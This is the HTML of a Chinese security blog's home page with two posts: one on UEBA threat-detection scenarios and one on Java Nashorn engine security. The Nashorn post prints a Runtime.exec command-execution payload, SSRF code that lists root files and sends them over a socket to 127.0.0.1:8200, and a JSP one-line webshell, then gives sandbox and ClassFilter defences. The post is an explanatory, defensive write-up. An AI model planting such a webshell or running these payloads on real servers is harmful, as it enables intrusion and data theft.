@@ -1,0 +1,4613 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="网络安全,黑客,JAVA安全,代码审计,渗透测试,入侵,SRC,扫描,WEB安全,移动安全,PHP">
+    <meta name="description" content="蓝骨, langu.xyz">
+    <meta name="author" content="langu_xyz">
+    
+        <title>
+            
+                        langu_xyz
+        </title>
+        
+<link rel="stylesheet" href="/css/style.css">
+
+            <link rel="shortcut icon" href="/images/logo.jpeg">
+                
+<link rel="stylesheet" href="/css/font-awesome.min.css">
+
+                    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"blog.langu.xyz","root":"/","language":"zh","path":"search.json"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/images/logo.jpeg","favicon":"/images/logo.jpeg","article_img_align":"center","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":false},"first_screen":{"enable":true,"background_img":"/images/shamo.jpg","description":"XYZ(无限未来)"},"scroll":{"progress_bar":{"enable":true},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":true},"lazyload":{"enable":true},"version":"3.4.3"};
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+  </script>
+
+                    <script>
+                        var _hmt = _hmt || [];
+                        (function() {
+                          var hm = document.createElement("script");
+                          hm.src = "https://hm.baidu.com/hm.js?1cd6e64ff252acf24b707985fcec8850";
+                          var s = document.getElementsByTagName("script")[0]; 
+                          s.parentNode.insertBefore(hm, s);
+                        })();
+                        </script>
+                        
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="langu_xyz" type="application/atom+xml">
+</head>
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="pjax-progress-icon">
+            <i class="fas fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+                    <a class="logo-title" href="/">
+                        langu_xyz
+                    </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class="active" href="/" >
+                                HOME
+                            </a>
+                        </li>
+                        
+                        <li class="menu-item">
+                            <a class="" href="/tags/THINK/" >
+                                THINK
+                            </a>
+                        </li>
+                        
+                            
+                                <li class="menu-item search search-popup-trigger">
+                                    <i class="fas fa-search"></i>
+                                </li>
+                                
+                                
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                    
+                        <div class="icon-item menu-bar">
+                            <div class="menu-bar-middle"></div>
+                        </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class="active" href="/" >
+                        HOME
+                    </a>
+                </li>
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class="" href="/tags/THINK/" >
+                        THINK
+                    </a>
+                </li>
+                
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="home-content-container fade-in-down-animation">
+    <ul class="home-article-list">
+        
+            <li class="home-article-item">
+
+                
+
+                <h3 class="home-article-title">
+                    <a href="/UEBA(%E7%94%A8%E6%88%B7%E5%92%8C%E5%AE%9E%E4%BD%93%E8%A1%8C%E4%B8%BA%E5%88%86%E6%9E%90)%E5%8F%AF%E4%BB%A5%E7%94%A8%E6%9D%A5%E5%81%9A%E4%BB%80%E4%B9%88%EF%BC%88%E5%8D%81%E5%A4%A7%E5%9C%BA%E6%99%AF%EF%BC%89/">
+                        UEBA(用户和实体行为分析)可以用来做什么（十大场景）
+                    </a>
+                </h3>
+
+                <!-- <div class="home-article-content markdown-body">
+                    
+                        一、UEBA简介UEBA 监控用户和实体的活动（如硬件设备和网络），并将当前活动与”正常”或”基线”行为进行比较。使用先进的统计分析，在某些情况下，机器学习算法，目的是要么检测异常活动，这可能是入侵或恶意”内部”行动的迹象，或发现已知的恶意行为模式。
+UEBA VS. UBAUBA：重点是分析用户如何与数据交互UEBA：Gartner 说，UEBA 一词”认识到一个事实，即除了用户之外，其他实体经常被分析，以便更准确地定位威胁，部分原因在于将这些其他实体的行为与用户行为相关联
+UEBA VS. SIEM由于许多公司安全团队已经实现了安全信息和事件管理(SIEM)解决方案，一个常见的问题是UEBA和SIEM是否提供了相同的保护。毕竟，它们都收集与安全相关的信息，这些信息可以指示潜在的或正在发生的威胁。共同点都是收集非常多的数据进行分析，SIEM关注的更多是事件，UEBA更多的关注的是人的风险，当然这两者的界限在某些情境下可能非常窄。
+二、为什么要做UEBA1、内部的威胁往往不会触发告警2、IoCs和静态检测很多时候是没有效果的（例如URLs、C&amp;C Servers、IP Adresses等）3、攻击数据可以捕捉，但是攻击本身却很难4、大量的日志、事件、告警是容易混乱的
+1、使用异常行为来检测攻击2、使用机器模型规模分析所有的数据
+三、UEBA的十个典型场景1、登录凭证泄漏检测问题描述：    1. 凭证失窃是一个大麻烦，仅次于钓鱼攻击；    2. 黑客使用窃取的凭证和相应的权限进入内部；    3. 最厉害的安全工具也无法区分合法的未授权访问。
+UEBA解法：    1. 识别异常的账号访问、行动、设备、设备使用、应用对象进入等
+2、特权用户监控问题描述：    1. 特权账户能访问高价值资源，一旦泄漏，将会导致最大的影响；    2. 特权用户的工作模式往往不受规则限制和不可预测的。
+UEBA解法：    1. 识别特权用户通过上下文数据或者行为，例如执行管理行为或者使用特权系统等；    2. 识别风险的异常活动，通过关联多个数据源来降低误报。
+3、经营管理相关的用户、资产监控问题描述：    1. 经营管理相关的资产往往包含敏感数据，例如关于收益、合并和收购、预算计划、产品和服务计划或竞争信息等；    2. 有时候更困难的可能是确定哪些资产是经营管理相关的。
+UEBA解法：    1. 通过使用模式去自动判断经营管理相关资产；    2. 通过行为识别异常访问和活动；    3. 检测对内部有损害和恶意的使用。
+4、系统、主机、设备等的入侵检测问题描述：    1. 像IoT、OT等资产是黑客们频繁的目标，IoT是被用来获得网络访问权限的立足点，OT对于一些黑客来说是高价值目标；    2. 可能有多个用户和它们交互；    3. 许多攻击通过多个用户和资产来实现。
+UEBA解法：    1. 识别和分类设备，例如服务器、工作站、IoT设备等；    2. 构建正常行为基线，包括端口、协议、授权、访问、活动等；    3. 监测异常活动和相关联的用户。
+5、内部访问滥用问题描述：    1. 内部员工可能是恶意、被入侵或疏忽的；    2. 当攻击者进入到内网中和多个系统中后很难被检测到；    3. 在大多数传统的安全工具中，它们不会触发警报。
+UEBA解法：    1. 识别高风险、异常的行为，和它自身、同职位、同组织等相比较来检测内部威胁；    2. 通过提供全部数据中的异常行为视图来帮助识别攻击动机。
+6、横向移动检测问题描述：    1. 攻击者通过内部网络移动搜寻敏感数据和资产；    2. 在攻击者横向移动后，安全工具和安全团队经常失去攻击者的踪迹；    3. 结果可能导致全部攻击或部分攻击被忽略。
+UEBA解法：    1. 通过行为分析去检测异常账户活动、账户切换、远程连接、PTH攻击等；    2. 当攻击者在网络中移动的时候进行追踪；    3. 攻击路径复现在单时间线下是容易的。
+7、数据泄露检测问题描述：    1. 敏感数据被非法转移到组织外；    2. 恶意的、被入侵的或疏忽的内部人员导致的；    3、像DLP等流行的工具在处理这类问题是误报率较高。
+UEBA解法：    1. 识别不一样的数据访问、向外数据传输、USB活动、打印机活动、文件活动等等；    2. UEBA通过关联用户、角色、正常行为等上下文来实现低误报；    3. 在攻击生命周期中能更早的发现数据泄漏；    4. 上述内容的DLP攻击是基于行为和风险的。
+8、失败的登录尝试和账户锁定问题描述：    1. 产生的原因有很多，例如爆破攻击、密码重置、忘记密码、乌龙指等；    2. 在可允许的上下文中需要几分钟或者几小时去解决每个锁定；    3. 通常需要一个人去确认和解决。
+UEBA解法：    1. 基于风险进行排序，允许安全团队关闭高风险的账号；    2. 提供锁定账号的相关内容协助快速处置；    3. 在账号锁定前后发生了什么？
+9、服务账号滥用问题描述：    1. 服务账号往往有较高的权限，对于攻击者来说是高价值目标；    2. 一些组织甚至不知道有一些服务账号在他们组织中存在；    3. 典型的安全工具对服务账户提供有限或不可见性的防护。
+UEBA解法：    1. 通过理解、分析行为，自动识别服务账户；    2. 标记表明妥协或滥用的异常行为；    3. 通过相关的事件背景，提供一个清晰的事件链。
+10、安全告警调查问题描述：    1. 告警排查在很多分析中都是关键任务；    2. 它非常手工、耗时且容易出错；    3. 有太多的事件告警时误报。
+UEBA解法：    1. 分析告警整体的通过全部的数据源；    2. 通过行为分析和风险排序去发现高风险告警或者异常告警；    3. 为事件排查人员提供一系列简短的高保真告警调查；    4. 通过自动化的方式规模化处理告警。
+
+                    
+                </div> -->
+                <div class="article-content markdown-body">
+                    <h2 id="一、UEBA简介"><a href="#一、UEBA简介" class="headerlink" title="一、UEBA简介"></a>一、UEBA简介</h2><p>UEBA 监控用户和实体的活动（如硬件设备和网络），并将当前活动与”正常”或”基线”行为进行比较。使用先进的统计分析，在某些情况下，机器学习算法，目的是要么检测异常活动，这可能是入侵或恶意”内部”行动的迹象，或发现已知的恶意行为模式。</p>
+<h3 id="UEBA-VS-UBA"><a href="#UEBA-VS-UBA" class="headerlink" title="UEBA VS. UBA"></a>UEBA VS. UBA</h3><p>UBA：重点是分析用户如何与数据交互<br>UEBA：Gartner 说，UEBA 一词”认识到一个事实，即除了用户之外，其他实体经常被分析，以便更准确地定位威胁，部分原因在于将这些其他实体的行为与用户行为相关联</p>
+<h3 id="UEBA-VS-SIEM"><a href="#UEBA-VS-SIEM" class="headerlink" title="UEBA VS. SIEM"></a>UEBA VS. SIEM</h3><p>由于许多公司安全团队已经实现了安全信息和事件管理(SIEM)解决方案，一个常见的问题是UEBA和SIEM是否提供了相同的保护。毕竟，它们都收集与安全相关的信息，这些信息可以指示潜在的或正在发生的威胁。<br>共同点都是收集非常多的数据进行分析，SIEM关注的更多是事件，UEBA更多的关注的是人的风险，当然这两者的界限在某些情境下可能非常窄。</p>
+<h2 id="二、为什么要做UEBA"><a href="#二、为什么要做UEBA" class="headerlink" title="二、为什么要做UEBA"></a>二、为什么要做UEBA</h2><p>1、内部的威胁往往不会触发告警<br>2、IoCs和静态检测很多时候是没有效果的（例如URLs、C&amp;C Servers、IP Adresses等）<br>3、攻击数据可以捕捉，但是攻击本身却很难<br>4、大量的日志、事件、告警是容易混乱的</p>
+<p>1、使用异常行为来检测攻击<br>2、使用机器模型规模分析所有的数据</p>
+<h2 id="三、UEBA的十个典型场景"><a href="#三、UEBA的十个典型场景" class="headerlink" title="三、UEBA的十个典型场景"></a>三、UEBA的十个典型场景</h2><h3 id="1、登录凭证泄漏检测"><a href="#1、登录凭证泄漏检测" class="headerlink" title="1、登录凭证泄漏检测"></a>1、登录凭证泄漏检测</h3><p>问题描述：<br>    1. 凭证失窃是一个大麻烦，仅次于钓鱼攻击；<br>    2. 黑客使用窃取的凭证和相应的权限进入内部；<br>    3. 最厉害的安全工具也无法区分合法的未授权访问。</p>
+<p>UEBA解法：<br>    1. 识别异常的账号访问、行动、设备、设备使用、应用对象进入等</p>
+<h3 id="2、特权用户监控"><a href="#2、特权用户监控" class="headerlink" title="2、特权用户监控"></a>2、特权用户监控</h3><p>问题描述：<br>    1. 特权账户能访问高价值资源，一旦泄漏，将会导致最大的影响；<br>    2. 特权用户的工作模式往往不受规则限制和不可预测的。</p>
+<p>UEBA解法：<br>    1. 识别特权用户通过上下文数据或者行为，例如执行管理行为或者使用特权系统等；<br>    2. 识别风险的异常活动，通过关联多个数据源来降低误报。</p>
+<h3 id="3、经营管理相关的用户、资产监控"><a href="#3、经营管理相关的用户、资产监控" class="headerlink" title="3、经营管理相关的用户、资产监控"></a>3、经营管理相关的用户、资产监控</h3><p>问题描述：<br>    1. 经营管理相关的资产往往包含敏感数据，例如关于收益、合并和收购、预算计划、产品和服务计划或竞争信息等；<br>    2. 有时候更困难的可能是确定哪些资产是经营管理相关的。</p>
+<p>UEBA解法：<br>    1. 通过使用模式去自动判断经营管理相关资产；<br>    2. 通过行为识别异常访问和活动；<br>    3. 检测对内部有损害和恶意的使用。</p>
+<h3 id="4、系统、主机、设备等的入侵检测"><a href="#4、系统、主机、设备等的入侵检测" class="headerlink" title="4、系统、主机、设备等的入侵检测"></a>4、系统、主机、设备等的入侵检测</h3><p>问题描述：<br>    1. 像IoT、OT等资产是黑客们频繁的目标，IoT是被用来获得网络访问权限的立足点，OT对于一些黑客来说是高价值目标；<br>    2. 可能有多个用户和它们交互；<br>    3. 许多攻击通过多个用户和资产来实现。</p>
+<p>UEBA解法：<br>    1. 识别和分类设备，例如服务器、工作站、IoT设备等；<br>    2. 构建正常行为基线，包括端口、协议、授权、访问、活动等；<br>    3. 监测异常活动和相关联的用户。</p>
+<h3 id="5、内部访问滥用"><a href="#5、内部访问滥用" class="headerlink" title="5、内部访问滥用"></a>5、内部访问滥用</h3><p>问题描述：<br>    1. 内部员工可能是恶意、被入侵或疏忽的；<br>    2. 当攻击者进入到内网中和多个系统中后很难被检测到；<br>    3. 在大多数传统的安全工具中，它们不会触发警报。</p>
+<p>UEBA解法：<br>    1. 识别高风险、异常的行为，和它自身、同职位、同组织等相比较来检测内部威胁；<br>    2. 通过提供全部数据中的异常行为视图来帮助识别攻击动机。</p>
+<h3 id="6、横向移动检测"><a href="#6、横向移动检测" class="headerlink" title="6、横向移动检测"></a>6、横向移动检测</h3><p>问题描述：<br>    1. 攻击者通过内部网络移动搜寻敏感数据和资产；<br>    2. 在攻击者横向移动后，安全工具和安全团队经常失去攻击者的踪迹；<br>    3. 结果可能导致全部攻击或部分攻击被忽略。</p>
+<p>UEBA解法：<br>    1. 通过行为分析去检测异常账户活动、账户切换、远程连接、PTH攻击等；<br>    2. 当攻击者在网络中移动的时候进行追踪；<br>    3. 攻击路径复现在单时间线下是容易的。</p>
+<h3 id="7、数据泄露检测"><a href="#7、数据泄露检测" class="headerlink" title="7、数据泄露检测"></a>7、数据泄露检测</h3><p>问题描述：<br>    1. 敏感数据被非法转移到组织外；<br>    2. 恶意的、被入侵的或疏忽的内部人员导致的；<br>    3、像DLP等流行的工具在处理这类问题是误报率较高。</p>
+<p>UEBA解法：<br>    1. 识别不一样的数据访问、向外数据传输、USB活动、打印机活动、文件活动等等；<br>    2. UEBA通过关联用户、角色、正常行为等上下文来实现低误报；<br>    3. 在攻击生命周期中能更早的发现数据泄漏；<br>    4. 上述内容的DLP攻击是基于行为和风险的。</p>
+<h3 id="8、失败的登录尝试和账户锁定"><a href="#8、失败的登录尝试和账户锁定" class="headerlink" title="8、失败的登录尝试和账户锁定"></a>8、失败的登录尝试和账户锁定</h3><p>问题描述：<br>    1. 产生的原因有很多，例如爆破攻击、密码重置、忘记密码、乌龙指等；<br>    2. 在可允许的上下文中需要几分钟或者几小时去解决每个锁定；<br>    3. 通常需要一个人去确认和解决。</p>
+<p>UEBA解法：<br>    1. 基于风险进行排序，允许安全团队关闭高风险的账号；<br>    2. 提供锁定账号的相关内容协助快速处置；<br>    3. 在账号锁定前后发生了什么？</p>
+<h3 id="9、服务账号滥用"><a href="#9、服务账号滥用" class="headerlink" title="9、服务账号滥用"></a>9、服务账号滥用</h3><p>问题描述：<br>    1. 服务账号往往有较高的权限，对于攻击者来说是高价值目标；<br>    2. 一些组织甚至不知道有一些服务账号在他们组织中存在；<br>    3. 典型的安全工具对服务账户提供有限或不可见性的防护。</p>
+<p>UEBA解法：<br>    1. 通过理解、分析行为，自动识别服务账户；<br>    2. 标记表明妥协或滥用的异常行为；<br>    3. 通过相关的事件背景，提供一个清晰的事件链。</p>
+<h3 id="10、安全告警调查"><a href="#10、安全告警调查" class="headerlink" title="10、安全告警调查"></a>10、安全告警调查</h3><p>问题描述：<br>    1. 告警排查在很多分析中都是关键任务；<br>    2. 它非常手工、耗时且容易出错；<br>    3. 有太多的事件告警时误报。</p>
+<p>UEBA解法：<br>    1. 分析告警整体的通过全部的数据源；<br>    2. 通过行为分析和风险排序去发现高风险告警或者异常告警；<br>    3. 为事件排查人员提供一系列简短的高保真告警调查；<br>    4. 通过自动化的方式规模化处理告警。</p>
+
+                </div>
+
+                <div class="home-article-meta-info-container">
+    <div class="home-article-meta-info">
+        <span><i class="fas fa-history"></i>&nbsp;<span class="home-article-date" data-date="Tue Mar 15 2022 21:00:00 GMT+0800">2022-03-15</span></span>
+        
+            <span class="home-article-category"><i class="fas fa-folder"></i>&nbsp;
+                <ul>
+                    
+                        <li>
+                            
+                            <a href="/categories/%E5%AE%89%E5%85%A8%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90/">安全数据分析</a>&nbsp;
+                        </li>
+                    
+                    
+                </ul>
+            </span>
+        
+        
+            <span class="home-article-tag">
+                <i class="fas fa-tags"></i>&nbsp;
+                <ul>
+                    
+                        <li>
+                            
+                            <a href="/tags/UEBA/">UEBA</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            </span>
+        
+    </div>
+
+    <a href="/UEBA(%E7%94%A8%E6%88%B7%E5%92%8C%E5%AE%9E%E4%BD%93%E8%A1%8C%E4%B8%BA%E5%88%86%E6%9E%90)%E5%8F%AF%E4%BB%A5%E7%94%A8%E6%9D%A5%E5%81%9A%E4%BB%80%E4%B9%88%EF%BC%88%E5%8D%81%E5%A4%A7%E5%9C%BA%E6%99%AF%EF%BC%89/">Read more&nbsp;<i class="fas fa-angle-right"></i></a>
+</div>
+
+            </li>
+        
+            <li class="home-article-item">
+
+                
+
+                <h3 class="home-article-title">
+                    <a href="/Java%20NashornJS%E5%BC%95%E6%93%8E%E4%BB%A3%E7%A0%81%E5%AE%89%E5%85%A8%E6%89%A7%E8%A1%8C/">
+                        Java NashornJS引擎代码安全执行
+                    </a>
+                </h3>
+
+                <!-- <div class="home-article-content markdown-body">
+                    
+                        一、什么是Nashorn在 Java SE 7 之前，JDK 附带了一个基于 Mozilla Rhino 的 JavaScript 脚本引擎。Java SE 8 将搭载一个名为 Oracle Nashorn 的新引擎，该引擎基于JSR 292和invokedynamic. invokedynamic它通过绑定调用站点提供了对 ECMA 规范化 JavaScript 规范的更好合规性和更好的运行时性能。
+遵循ECMAScript，
+1234567891011121314import javax.script.ScriptEngine;import javax.script.ScriptEngineManager;public class Hello &#123;  public static void main(String... args) throws Throwable &#123;    ScriptEngineManager engineManager = new ScriptEngineManager();    ScriptEngine engine = engineManager.getEngineByName(&quot;nashorn&quot;);    engine.eval(&quot;function sum(a, b) &#123; return a + b; &#125;&quot;);    System.out.println(engine.eval(&quot;sum(1, 2);&quot;));  &#125;&#125;
+
+￼
+二、通过Nashorn实现命令执行1234567891011public static void main(String[] args) throws ScriptException &#123;    String test=&quot;var a = mainOutput(); function mainOutput() &#123; var x=java.lang.Runtime.getRuntime().exec(&#x27;open /System/Applications/Calculator.app/Contents/MacOS/Calculator&#x27;)&#125;;&quot;;    ScriptEngineManager scriptEngineManager = new ScriptEngineManager();    ScriptEngine scriptEngine = scriptEngineManager.getEngineByName(&quot;nashorn&quot;);    scriptEngine.eval(test);&#125;
+
+三、通过Nashorn实现SSRF攻击1234567891011121314public static void main(String[] args) throws ScriptException &#123;    //此处感谢5am3帮忙debug    //方法1        String test3 = &quot;var a=mainOutput();function mainOutput()&#123;var file=new java.io.File(\&quot;/\&quot;);var fileLists=file.listFiles();var s=new java.net.Socket(\&quot;127.0.0.1\&quot;,8200);for(var i=0;i&lt;fileLists.length;i++)&#123;var out=s.getOutputStream();out.write(fileLists[i].getName().getBytes());out.write(\&quot;\\n\&quot;.getBytes());&#125;&#125;;&quot;;        //方法2    String test5 = &quot;var a=mainOutput();function mainOutput()&#123; var url=new java.net.URL(&#x27;http://127.0.0.1:8200&#x27;);url.openConnection().getContent();&#125;;&quot;;    ScriptEngineManager scriptEngineManager = new ScriptEngineManager();    ScriptEngine scriptEngine = scriptEngineManager.getEngineByName(&quot;nashorn&quot;);    scriptEngine.eval(test5);&#125;
+
+四、其它利用一句话木马实现https://xz.aliyun.com/t/9715
+12345678&lt;%     javax.script.ScriptEngine engine = new javax.script.ScriptEngineManager().getEngineByName(&quot;js&quot;);     engine.put(&quot;request&quot;, request);     engine.put(&quot;response&quot;, response);     engine.eval(request.getParameter(&quot;mr6&quot;));%&gt;
+
+五、防御方法5.1 NashornSandboxhttps://github.com/javadelight/delight-nashorn-sandbox
+限制类
+123NashornSandbox sandbox = NashornSandboxes.create();     sandbox.allow(File.class);sandbox.eval(&quot;var File = Java.type(&#x27;java.io.File&#x27;); File;&quot;)
+实际效果
+1234NashornSandbox sandbox = NashornSandboxes.create();sandbox.allow(File.class);//sandbox.allow(Socket.class);sandbox.eval(test3);
+可以看到Socket没有被允许，执行失败￼￼
+5.2 自建ClassFilter12345678910111213141516171819202122232425262728293031323334353637public class EvalTest &#123;    public static void main(String[] args) throws ScriptException &#123;        String test3 = &quot;var a=mainOutput();function mainOutput()&#123;var file=new java.io.File(\&quot;/\&quot;);var fileLists=file.listFiles();var s=new java.net.Socket(\&quot;127.0.0.1\&quot;,8200);for(var i=0;i&lt;fileLists.length;i++)&#123;var out=s.getOutputStream();out.write(fileLists[i].getName().getBytes());out.write(\&quot;\\n\&quot;.getBytes());&#125;&#125;;&quot;;      //解析JS        NashornScriptEngineFactory factory = new NashornScriptEngineFactory();        ScriptEngine engine = factory.getScriptEngine(                new EvalTest.seClassFilterBlack());        engine.eval(test3);    &#125;        //黑名单方式    static class seClassFilterBlack implements ClassFilter&#123;        @Override        public boolean exposeToScripts(String s) &#123;            if (s.compareTo(&quot;java.io.File&quot;) == 0)                return false;            return true;        &#125;    &#125;    //白名单方式    static class seClassFilterWhite implements ClassFilter&#123;        @Override        public boolean exposeToScripts(String s) &#123;            if (s.compareTo(&quot;java.io.File&quot;) == 0)                return true;            return false;        &#125;    &#125;&#125;
+可以看到File没有加载，执行失败￼￼
+
+                    
+                </div> -->
+                <div class="article-content markdown-body">
+                    <h2 id="一、什么是Nashorn"><a href="#一、什么是Nashorn" class="headerlink" title="一、什么是Nashorn"></a>一、什么是Nashorn</h2><p>在 Java SE 7 之前，JDK 附带了一个基于 Mozilla Rhino 的 JavaScript 脚本引擎。Java SE 8 将搭载一个名为 Oracle Nashorn 的新引擎，该引擎基于JSR 292和invokedynamic. invokedynamic它通过绑定调用站点提供了对 ECMA 规范化 JavaScript 规范的更好合规性和更好的运行时性能。</p>
+<p>遵循ECMAScript，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import javax.script.ScriptEngine;</span><br><span class="line">import javax.script.ScriptEngineManager;</span><br><span class="line"></span><br><span class="line">public class Hello &#123;</span><br><span class="line"></span><br><span class="line">  public static void main(String... args) throws Throwable &#123;</span><br><span class="line">    ScriptEngineManager engineManager = </span><br><span class="line">new ScriptEngineManager();</span><br><span class="line">    ScriptEngine engine = </span><br><span class="line">engineManager.getEngineByName(&quot;nashorn&quot;);</span><br><span class="line">    engine.eval(&quot;function sum(a, b) &#123; return a + b; &#125;&quot;);</span><br><span class="line">    System.out.println(engine.eval(&quot;sum(1, 2);&quot;));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>￼<img lazyload src="/images/loading.svg" data-src="1.png"></p>
+<h2 id="二、通过Nashorn实现命令执行"><a href="#二、通过Nashorn实现命令执行" class="headerlink" title="二、通过Nashorn实现命令执行"></a>二、通过Nashorn实现命令执行</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) throws ScriptException &#123;</span><br><span class="line"></span><br><span class="line">    String test=&quot;var a = mainOutput(); function mainOutput() &#123; var x=java.lang.Runtime.getRuntime().exec(&#x27;open /System/Applications/Calculator.app/Contents/MacOS/Calculator&#x27;)&#125;;&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    ScriptEngineManager scriptEngineManager = new ScriptEngineManager();</span><br><span class="line">    ScriptEngine scriptEngine = scriptEngineManager.getEngineByName(&quot;nashorn&quot;);</span><br><span class="line"></span><br><span class="line">    scriptEngine.eval(test);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="三、通过Nashorn实现SSRF攻击"><a href="#三、通过Nashorn实现SSRF攻击" class="headerlink" title="三、通过Nashorn实现SSRF攻击"></a>三、通过Nashorn实现SSRF攻击</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) throws ScriptException &#123;</span><br><span class="line">    //此处感谢5am3帮忙debug</span><br><span class="line">    //方法1    </span><br><span class="line">    String test3 = &quot;var a=mainOutput();function mainOutput()&#123;var file=new java.io.File(\&quot;/\&quot;);var fileLists=file.listFiles();var s=new java.net.Socket(\&quot;127.0.0.1\&quot;,8200);for(var i=0;i&lt;fileLists.length;i++)&#123;var out=s.getOutputStream();out.write(fileLists[i].getName().getBytes());out.write(\&quot;\\n\&quot;.getBytes());&#125;&#125;;&quot;;</span><br><span class="line">    </span><br><span class="line">    //方法2</span><br><span class="line">    String test5 = &quot;var a=mainOutput();function mainOutput()&#123; var url=new java.net.URL(&#x27;http://127.0.0.1:8200&#x27;);url.openConnection().getContent();&#125;;&quot;;</span><br><span class="line"></span><br><span class="line">    ScriptEngineManager scriptEngineManager = new ScriptEngineManager();</span><br><span class="line">    ScriptEngine scriptEngine = scriptEngineManager.getEngineByName(&quot;nashorn&quot;);</span><br><span class="line"></span><br><span class="line">    scriptEngine.eval(test5);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="四、其它利用"><a href="#四、其它利用" class="headerlink" title="四、其它利用"></a>四、其它利用</h2><p>一句话木马实现<a class="link" target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9715">https://xz.aliyun.com/t/9715<i class="fas fa-external-link-alt"></i></a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line"></span><br><span class="line">     javax.script.ScriptEngine engine = new javax.script.ScriptEngineManager().getEngineByName(&quot;js&quot;);</span><br><span class="line">     engine.put(&quot;request&quot;, request);</span><br><span class="line">     engine.put(&quot;response&quot;, response);</span><br><span class="line">     engine.eval(request.getParameter(&quot;mr6&quot;));</span><br><span class="line"></span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="五、防御方法"><a href="#五、防御方法" class="headerlink" title="五、防御方法"></a>五、防御方法</h2><h3 id="5-1-NashornSandbox"><a href="#5-1-NashornSandbox" class="headerlink" title="5.1 NashornSandbox"></a>5.1 NashornSandbox</h3><p><a class="link" target="_blank" rel="noopener" href="https://github.com/javadelight/delight-nashorn-sandbox">https://github.com/javadelight/delight-nashorn-sandbox<i class="fas fa-external-link-alt"></i></a></p>
+<p>限制类</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">NashornSandbox sandbox = NashornSandboxes.create();     </span><br><span class="line">sandbox.allow(File.class);</span><br><span class="line">sandbox.eval(&quot;var File = Java.type(&#x27;java.io.File&#x27;); File;&quot;)</span><br></pre></td></tr></table></figure>
+<p>实际效果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">NashornSandbox sandbox = NashornSandboxes.create();</span><br><span class="line">sandbox.allow(File.class);</span><br><span class="line">//sandbox.allow(Socket.class);</span><br><span class="line">sandbox.eval(test3);</span><br></pre></td></tr></table></figure>
+<p>可以看到Socket没有被允许，执行失败<br>￼<br>￼<img lazyload src="/images/loading.svg" data-src="2.png"></p>
